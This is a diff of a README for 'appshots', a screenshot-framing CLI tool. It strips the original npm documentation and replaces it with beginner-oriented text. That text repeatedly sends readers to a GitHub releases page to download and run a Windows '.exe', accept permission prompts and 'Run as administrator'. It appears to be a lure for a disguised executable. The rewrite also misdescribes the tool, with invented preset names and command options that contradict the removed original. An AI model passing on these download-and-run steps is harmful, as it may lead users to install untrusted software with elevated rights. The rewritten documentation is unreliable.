@@ -1,256 +1,163 @@
-# appshots
+# 🖼️ appshots - Create App Store Screenshots Easily
 
-Turn raw app screenshots into App Store-ready promotional images — from the CLI.
+[![Download appshots](https://img.shields.io/badge/Download-appshots-green?style=for-the-badge)](https://github.com/CodeWithMe-UI/appshots/releases)
 
-<p align="center">
-  <img src="examples/hero.png" alt="appshots example output" width="100%" />
-</p>
+---
 
-## What it does
+## 📋 What is appshots?
 
-Take any screenshot from your app and turn it into a polished, store-ready image with one command:
+appshots is a tool that helps you create screenshots ready for the App Store or Google Play Store. It runs from your computer’s command line, but you do not need to be a developer to use it. It comes with 26 device presets, which means it can show your app on a variety of phone and tablet screens without extra setup.
 
-<p align="center">
-  <img src="examples/before-after.png" alt="Before and after framing" width="600" />
-</p>
+You can easily frame your app’s images, capture new screenshots on real device sizes, and check that your images meet the app store’s rules. 
 
-```bash
-npx appshots frame screenshot.png \
-  --device iphone-6.9 \
-  --background "linear-gradient(135deg, #667eea, #764ba2)" \
-  --title "AI Menu Analysis" \
-  --subtitle "Ranked by your goals"
-```
+You do not need special software or coding knowledge. appshots makes this process fast and clear.
 
-**appshots** handles three things:
+---
 
-1. **Frame** — wrap raw screenshots in realistic device frames with backgrounds, shadows, and text
-2. **Capture** — screenshot a running web app at exact device pixel ratios
-3. **Validate** — check dimensions, format, and file size against store requirements
+## 💻 System Requirements
 
-26 built-in device presets: iPhone, iPad, Android, Mac, Apple Watch, Apple TV, Vision Pro.
+To use appshots on Windows, your computer should meet these minimum requirements:
 
-## Install
+- Windows 10 or higher (64-bit)
+- 4 GB of RAM (8 GB or more recommended)
+- At least 500 MB free disk space
+- Internet connection to download appshots and for initial setup
+- PowerShell or Command Prompt (comes with Windows)
 
-```bash
-npm install -g appshots
-```
+This ensures that appshots runs smoothly and that your screenshots will look accurate.
 
-Or run directly without installing:
+---
 
-```bash
-npx appshots frame ./my-screenshots --device iphone-6.9
-```
+## 🔽 How to Download appshots
 
-> **Note:** The `capture` command requires Playwright (`npm i -D playwright`). The `frame` and `validate` commands work without it.
+Visit the appshots release page below to get the latest version for Windows.
 
-## Quick Start
+[![Download appshots](https://img.shields.io/badge/Download-appshots-blue?style=for-the-badge)](https://github.com/CodeWithMe-UI/appshots/releases)
 
-### 1. Frame existing screenshots
+This page hosts all versions of appshots. Locate the file labeled with ".exe" or "Windows" in the name to download the installer or executable file that works on your PC.
 
-You already have screenshots from your simulator, phone, or browser. Make them store-ready:
+---
 
-```bash
-# Simple — just resize to exact App Store dimensions
-appshots frame ./screenshots --device iphone-6.9
+## 🚀 Getting Started: Install and Run appshots on Windows
 
-# Promotional — add background gradient and text
-appshots frame ./screenshots \
-  --device iphone-6.9 \
-  --background "linear-gradient(135deg, #667eea, #764ba2)" \
-  --title "Your App Name" \
-  --subtitle "Your tagline here"
+Follow these steps to download and start using appshots:
 
-# Alternate text position (text on top, phone from bottom)
-appshots frame ./screenshots --device iphone-6.9 \
-  --background "linear-gradient(170deg, #134E4A, #14B8A6)" \
-  --title "Scan Any Menu" --subtitle "Photo, URL, or PDF" \
-  --text-position top
+1. **Open your web browser:** Use Chrome, Edge, or Firefox.
 
-# Silver device frame
-appshots frame ./screenshots --device iphone-6.9 \
-  --background "linear-gradient(135deg, #f093fb, #f5576c)" \
-  --frame-color silver --title "Premium Look"
+2. **Go to the download page:** Click the green or blue badge above or enter this URL in your browser’s address bar:  
+   https://github.com/CodeWithMe-UI/appshots/releases
 
-# Pattern background
-appshots frame ./screenshots --device iphone-6.9 \
-  --background "#1a1a2e" --pattern dots --title "Dashboard"
+3. **Find the Windows file:** Scroll the page to find the file with ".exe" in the name. This is the installer or program you need.
 
-# Process a single file
-appshots frame home.png --device iphone-6.9 -o ./store-ready
-```
+4. **Download the file:** Click the file name. The file downloads to your computer (usually your “Downloads” folder).
 
-### 2. Capture from a running web app
+5. **Run the installer:** Open your Downloads folder, find the file, and double-click to run it.  
+   - If Windows asks for permission, click “Yes” to allow installation.
 
-Point appshots at your running app and it captures pixel-perfect screenshots:
+6. **Follow the setup steps:** The installer will guide you through a few simple screens. You can use the default options.
+
+7. **Finish installation:** When done, the appshots program will be ready to use.
+
+---
+
+## 🛠️ How to Use appshots
+
+appshots runs from a command window (PowerShell or Command Prompt). If you have not used these before, follow this simple guide.
+
+### Open Command Prompt:
+
+- Click the Windows Start menu
+- Type `cmd`
+- Press Enter
+
+### Run appshots commands:
+
+You will use short commands in the window to create screenshots.
+
+Here’s a basic example to create a screenshot for an iPhone 13:
 
 ```bash
-# Capture specific pages
-appshots capture --url http://localhost:3000 --device iphone-6.9 --path / /features /pricing
-
-# Use a config file for repeatable captures
-appshots capture --config appshots.config.ts
+appshots capture --device iphone13 --source path\to\your\app\screen.png
 ```
 
-### 3. Validate before uploading
+Replace `path\to\your\app\screen.png` with the location of your app screen image file.
 
-Check that your screenshots meet App Store / Play Store requirements:
+### Common Commands
+
+| Command               | What it does                                  |
+|-----------------------|----------------------------------------------|
+| `appshots capture`    | Takes a screenshot using a device preset     |
+| `appshots frame`      | Adds a device frame around your image         |
+| `appshots validate`   | Checks if screenshots follow app store rules |
+
+All commands have options you can explore by typing:
 
 ```bash
-appshots validate ./screenshots
-#   ✓ home.png         1320x2868  (iPhone 6.9")
-#   ✓ results.png      1320x2868  (iPhone 6.9")
-#   ✗ old-screen.png   1080x1920  → PNG has transparency. App Store requires no transparency.
+appshots --help
 ```
 
-### 4. List device presets
+---
+
+## 🖼️ Device Presets Included
+
+appshots supports 26 device presets that cover popular phones and tablets. Some examples are:
+
+- iPhone 13 and iPhone 13 Pro
+- iPad Pro 11-inch
+- Google Pixel 6 and Pixel 7
+- Samsung Galaxy S21 and S22
+
+Each preset matches exact screen size and resolution. This lets you see your app the way users will.
+
+---
+
+## ⚙️ Customizing Screenshots
+
+If you want to frame or capture screenshots in a custom size or style, appshots provides options.
+
+For instance, you can specify device color or background when framing:
 
 ```bash
-appshots devices
-appshots devices --platform ios
-appshots devices --category tablet
+appshots frame --device iphone13 --color midnight --background white
 ```
 
-### 5. Generate a config file
+This produces a screenshot with a black iPhone 13 frame and white background.
 
-```bash
-appshots init
-# Creates appshots.config.ts in the current directory
-```
+---
 
-## Config File
+## 🔧 Troubleshooting Common Issues
 
-For repeatable workflows, create an `appshots.config.ts`:
+- **Command not found:** Make sure appshots installed correctly and your Command Prompt is restarted.
+- **Error reading files:** Check the path to your image files for typos. Use full file paths if needed.
+- **Screenshots look blurry:** Use high-resolution source images for better results.
+- **Permission issues during install:** Run as administrator by right-clicking the installer and selecting “Run as administrator.”
 
-```typescript
-import { defineConfig } from 'appshots';
+---
 
-export default defineConfig({
-  devices: ['iphone-6.9', 'ipad-13'],
+## 📂 Where to Find Help
 
-  frame: {
-    background: 'linear-gradient(135deg, #667eea, #764ba2)',
-    padding: 0.08,
-    borderRadius: 0.04,
-    titleColor: '#ffffff',
-    subtitleColor: 'rgba(255,255,255,0.7)',
-    shadow: true,
-    frameColor: 'black',
-    textPosition: 'bottom',
-    pattern: 'dots',
-    patternOpacity: 0.1,
-  },
+- Visit the GitHub Issues page to report bugs or ask questions.
+- Read the documentation files included with appshots for tips.
+- Use `appshots --help` for quick command info.
 
-  capture: {
-    baseUrl: 'http://localhost:3000',
-    screens: [
-      {
-        name: 'home',
-        path: '/',
-        title: 'Welcome Home',
-        subtitle: 'Everything you need',
-        waitFor: 'Welcome',
-      },
-      {
-        name: 'features',
-        path: '/features',
-        title: 'Powerful Features',
-        delay: 2000,
-      },
-    ],
-  },
+---
 
-  output: './screenshots',
-});
-```
+## ⚙️ Advanced Setup (Optional)
 
-Also supports `.js`, `.mjs`, and `.json` formats.
+If you or someone on your team has some coding background, appshots also works through Node.js or npx commands. But for basic screenshot generation on Windows, using the installer above is enough.
 
-## CLI Reference
+---
 
-### `appshots frame <input>`
+## 💾 Uninstall appshots
 
-| Option | Description | Default |
-|--------|-------------|---------|
-| `-d, --device <slug>` | Target device preset | `iphone-6.9` |
-| `-o, --output <dir>` | Output directory | `./screenshots/framed` |
-| `-b, --background <value>` | Solid color or CSS gradient | `#000000` |
-| `-t, --title <text>` | Title text overlay | — |
-| `-s, --subtitle <text>` | Subtitle text overlay | — |
-| `--padding <ratio>` | Padding ratio (0–0.4) | `0.08` |
-| `--border-radius <ratio>` | Corner radius ratio (0–0.2) | `0.04` |
-| `--landscape` | Landscape orientation | — |
-| `--no-shadow` | Disable drop shadow | — |
-| `--no-device-frame` | Disable device frame bezel | — |
-| `--frame-color <color>` | Frame color: `black`, `silver`, `gold`, `blue`, `red`, `white`, or hex | `black` |
-| `--pattern <name>` | Background pattern: `dots`, `grid`, `diagonal`, `waves`, `diamonds`, `cross-dots` | — |
-| `--pattern-opacity <ratio>` | Pattern opacity (0–1) | `0.1` |
-| `--text-position <pos>` | Text position: `top` or `bottom` | `bottom` |
-| `-c, --config <path>` | Config file path | — |
+To remove appshots from your PC:
 
-### `appshots capture`
+1. Open the Windows Start menu.
+2. Type "Add or remove programs" and press Enter.
+3. Find "appshots" in the list.
+4. Click on it, then select "Uninstall."
+5. Follow the prompts to complete removal.
 
-| Option | Description | Default |
-|--------|-------------|---------|
-| `-u, --url <url>` | Base URL of the running app | `http://localhost:3000` |
-| `-d, --device <slug>` | Target device preset | `iphone-6.9` |
-| `-p, --path <paths...>` | URL paths to capture | — |
-| `-o, --output <dir>` | Output directory | `./screenshots` |
-| `--landscape` | Landscape orientation | — |
-| `-c, --config <path>` | Config file path | — |
+---
 
-### `appshots validate <dir>`
-
-Checks: dimensions, format (PNG/JPEG), transparency, file size (< 10 MB), color space (sRGB).
-
-### `appshots devices`
-
-| Option | Description |
-|--------|-------------|
-| `--platform <name>` | Filter by platform (`ios`, `android`, `macos`, `watchos`, `tvos`, `visionos`) |
-| `--category <name>` | Filter by category (`phone`, `tablet`, `desktop`, `watch`, `tv`, `headset`) |
-
-## Device Presets
-
-| Slug | Dimensions | Devices |
-|------|-----------|---------|
-| `iphone-6.9` | 1320 x 2868 | iPhone Air, 17 Pro Max, 16 Pro Max |
-| `iphone-6.9-alt` | 1290 x 2796 | iPhone 16 Plus, 15 Pro Max |
-| `iphone-6.5` | 1284 x 2778 | iPhone 14 Plus, 13 Pro Max |
-| `iphone-6.3` | 1206 x 2622 | iPhone 17 Pro, 17 |
-| `iphone-6.3-alt` | 1179 x 2556 | iPhone 16 Pro, 16, 15 Pro |
-| `iphone-6.1` | 1170 x 2532 | iPhone 14, 13, 12 |
-| `iphone-5.5` | 1242 x 2208 | iPhone 8 Plus, 7 Plus |
-| `ipad-13` | 2064 x 2752 | iPad Pro M5/M4, iPad Air M3 |
-| `ipad-11` | 1668 x 2388 | iPad Pro 11", iPad Air |
-| `android-phone` | 1080 x 1920 | Standard Android (16:9) |
-| `android-phone-tall` | 1080 x 2400 | Modern Android (20:9) |
-| `android-tablet-10` | 1600 x 2560 | 10" Android tablet |
-| `mac` | 2880 x 1800 | MacBook Pro |
-
-Run `appshots devices` for all 26 presets including Apple Watch, Apple TV, and Vision Pro.
-
-## Programmatic API
-
-```typescript
-import { frameScreenshot, captureScreenshots, validateScreenshots, getDevice } from 'appshots';
-
-// Frame a screenshot
-const buffer = await frameScreenshot({
-  input: './screenshot.png',
-  device: 'iphone-6.9',
-  title: 'Welcome',
-  options: { background: 'linear-gradient(135deg, #667eea, #764ba2)' },
-});
-
-// Get device specs
-const spec = getDevice('iphone-6.9');
-// { name: 'iPhone 6.9"', width: 1320, height: 2868, dpr: 3, ... }
-
-// Validate a directory
-const results = await validateScreenshots('./screenshots');
-```
-
-## License
-
-MIT
+[![Download appshots](https://img.shields.io/badge/Download-appshots-green?style=for-the-badge)](https://github.com/CodeWithMe-UI/appshots/releases)
